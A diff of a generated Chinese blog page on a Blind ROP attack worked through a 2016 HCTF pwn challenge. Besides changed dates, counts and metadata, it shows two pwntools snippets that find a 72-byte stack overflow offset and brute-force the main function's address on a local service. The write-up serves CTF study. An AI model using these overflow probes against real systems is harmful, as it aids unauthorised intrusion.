@@ -20,15 +20,15 @@
     var CONFIG = {"hostname":"example.com","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
   </script>
 
-  <meta name="description" content="这个攻击的实践以2016年的hctf中的一个pwn题为例。虽然这个例子中没有包含攻击原理的全部细节，但是作为这种攻击的入门还是不错的。这道题目没有给二进制文件，只能采用BROP。1.经过测试，当输入字符超过72字节时，程序不会显示No password, No game   1234567891011# 测试栈溢出大小 72for i in range(0, 200):    r &#x3D; remote">
+  <meta name="description" content="这个攻击的实践以2016年的hctf中的一个pwn题为例。虽然这个例子中没有包含攻击原理的全部细节，但是作为这种攻击的入门还是不错的。这道题目没有给二进制文件，只能采用BROP。">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Blind Return Oriented Programming (BROP) Attack攻击实践">
 <meta property="og:url" content="http://example.com/2017/02/22/Blind-Return-Oriented-Programming-BROP-Attack%E6%94%BB%E5%87%BB%E5%AE%9E%E8%B7%B5/index.html">
 <meta property="og:site_name" content="BruceFan&#39;s Blog">
-<meta property="og:description" content="这个攻击的实践以2016年的hctf中的一个pwn题为例。虽然这个例子中没有包含攻击原理的全部细节，但是作为这种攻击的入门还是不错的。这道题目没有给二进制文件，只能采用BROP。1.经过测试，当输入字符超过72字节时，程序不会显示No password, No game   1234567891011# 测试栈溢出大小 72for i in range(0, 200):    r &#x3D; remote">
+<meta property="og:description" content="这个攻击的实践以2016年的hctf中的一个pwn题为例。虽然这个例子中没有包含攻击原理的全部细节，但是作为这种攻击的入门还是不错的。这道题目没有给二进制文件，只能采用BROP。">
 <meta property="og:locale">
 <meta property="article:published_time" content="2017-02-22T07:46:38.000Z">
-<meta property="article:modified_time" content="2020-11-12T02:26:14.691Z">
+<meta property="article:modified_time" content="2022-08-09T16:01:26.436Z">
 <meta property="article:author" content="Bruce Fan">
 <meta property="article:tag" content="Pwn">
 <meta name="twitter:card" content="summary">
@@ -192,7 +192,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">Edited on</span>
-                <time title="更新于：2020-11-12 10:26:14" itemprop="dateModified" datetime="2020-11-12T10:26:14+08:00">2020-11-12</time>
+                <time title="更新于：2022-08-10 00:01:26" itemprop="dateModified" datetime="2022-08-10T00:01:26+08:00">2022-08-10</time>
               </span>
 
           
@@ -206,7 +206,9 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <p>这个攻击的实践以2016年的hctf中的一个pwn题为例。虽然这个例子中没有包含<a target="_blank" rel="noopener" href="http://pwn4.fun/2017/02/13/Blind-Return-Oriented-Programming-BROP-Attack%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86/">攻击原理</a>的全部细节，但是作为这种攻击的入门还是不错的。<br>这道题目没有给二进制文件，只能采用BROP。<br>1.经过测试，当输入字符超过72字节时，程序不会显示<strong>No password, No game</strong>  </p>
+        <p>这个攻击的实践以2016年的hctf中的一个pwn题为例。虽然这个例子中没有包含<a target="_blank" rel="noopener" href="http://pwn4.fun/2017/02/13/Blind-Return-Oriented-Programming-BROP-Attack%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86/">攻击原理</a>的全部细节，但是作为这种攻击的入门还是不错的。<br>这道题目没有给二进制文件，只能采用BROP。  </p>
+<a id="more"></a>
+<p>1.经过测试，当输入字符超过72字节时，程序不会显示<strong>No password, No game</strong>  </p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 测试栈溢出大小 72</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">200</span>):</span><br><span class="line">    r = remote(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">4444</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;?\n&quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">&#x27;A&#x27;</span> * i)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        r.recvuntil(<span class="string">&#x27;No password, no game&#x27;</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span> i</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    r.close()</span><br></pre></td></tr></table></figure>
 <p>2.假设没有开启PIE，则基地址为<code>0x08048000</code>或<code>0x400000</code>。首先尝试0x08048000，没有任何发现，因此判断系统为64位。<br>构造如下payload爆破，发现当<code>i=0x6bd</code>时，程序会重新开始，判断0x4006bd为main地址。  </p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x600</span>, <span class="number">0x1000</span>):</span><br><span class="line">    r = remote(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">4444</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;?\n&quot;</span>)</span><br><span class="line">    payload = <span class="string">&#x27;A&#x27;</span> * <span class="number">72</span> + p64(<span class="number">0x400000</span>+i)</span><br><span class="line">    r.sendline(payload)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        r.recvuntil(<span class="string">&#x27;?\n&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span> <span class="built_in">hex</span>(<span class="number">0x400000</span>+i)</span><br><span class="line">        r.interactive()</span><br><span class="line">        r.close()</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span> <span class="built_in">hex</span>(<span class="number">0x400000</span>+i)</span><br><span class="line">        r.close()</span><br><span class="line">        <span class="keyword">continue</span></span><br></pre></td></tr></table></figure>
@@ -319,14 +321,14 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">125</span>
+          <span class="site-state-item-count">127</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">17</span>
+        <span class="site-state-item-count">18</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
@@ -353,7 +355,7 @@
 <div class="copyright">
   
   &copy; 
-  <span itemprop="copyrightYear">2020</span>
+  <span itemprop="copyrightYear">2022</span>
   <span class="with-love">
     <i class="fa fa-heart"></i>
   </span>
